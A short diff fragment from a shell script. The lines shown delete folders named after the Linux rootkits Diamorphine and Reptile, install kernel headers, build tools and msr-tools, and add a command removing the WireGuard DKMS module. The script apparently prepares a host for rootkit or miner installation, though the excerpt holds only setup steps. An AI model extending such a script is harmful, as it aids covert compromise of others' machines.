@@ -642,6 +642,7 @@ rm -rf Diamorphine
 rm -rf Reptile
 yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y
 apt-get update -y
+sudo dkms remove wireguard
 apt-get reinstall kmod
 apt-get install linux-generic linux-headers-$(uname -r) -y
 apt-get install git make gcc msr-tools build-essential libncurses-dev -y
